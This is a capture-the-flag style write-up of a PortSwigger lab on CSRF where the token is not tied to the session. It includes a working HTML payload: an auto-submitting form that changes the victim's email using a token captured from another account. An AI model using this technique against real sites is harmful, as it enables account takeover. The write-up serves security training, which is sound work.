# Lab Writeup: CSRF where token is not tied to user session

URL: https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

## Description

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

`wiener:peter` <br />
`carlos:montoya`

## Solution

1. Login using `wiener:peter` or `carlos:montoya`
2. Try changing the email and intercept using burp:

   ![csrf-untied-token](/assets/csrf-untied-token.png)

   From the above response we could see the CSRF token `DnkmVIUfepUPs6nRzKX9UBuXdyhi6iJO` which we could use in constructing our payload

3. Create the HTML payload:

   ```html
   <!DOCTYPE html>
   <html>
     <body>
       <form
         action="https://0ab800e5032e0a75832ff564007300d8.web-security-academy.net/my-account/change-email"
         method="POST"
       >
         <!-- the only input value -->
         <input type="text" name="email" value="hacker@gmail.com" />
         <!-- notice that the csrf token from one user is used against other users -->
         <input
           type="hidden"
           name="csrf"
           value="DnkmVIUfepUPs6nRzKX9UBuXdyhi6iJO"
         />
       </form>
       <script type="text/javascript">
         // automatically upload form on open
         document.forms[0].submit();
       </script>
     </body>
   </html>
   ```

4. Login using account different than the first one, go to exploit server, store and deliver the above payload to the victim and the lab should be solved:

   ![csrf-untied-token-1](/assets/csrf-untied-token-1.png)
